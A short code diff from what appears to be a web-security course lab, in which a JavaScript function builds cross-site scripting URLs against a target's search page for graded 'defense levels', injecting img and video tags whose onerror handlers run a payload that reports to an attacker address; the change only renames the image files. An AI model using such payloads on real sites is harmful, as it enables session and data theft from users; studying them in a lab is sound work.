@@ -297,7 +297,7 @@ function makeLink(target, attacker, defense) {
             // TODO: generate XSS URL payload for defense level 2.2.3.4
             return target + "/search?xssdefense=" + (defense-2) + "&q=" +
                 encodeURIComponent(
-                    "<img src='image.jpeg' onerror=\"" +
+                    "<img src='gg.jpeg' onerror=\"" +
                     payload_string + 
                     "; payload('" + attacker + "');\"" + 
                     ">"
@@ -306,7 +306,7 @@ function makeLink(target, attacker, defense) {
             // TODO: generate XSS URL payload for defense level 2.2.3.5
             return target + "/search?xssdefense=" + (defense-2) + "&q=" +
                 encodeURIComponent(
-                    "<video src='image.jpeg' onerror=\"" +
+                    "<video src='gg.mov' onerror=\"" +
                     payload_string + 
                     "; payload('" + attacker + "');\"" + 
                     ">"
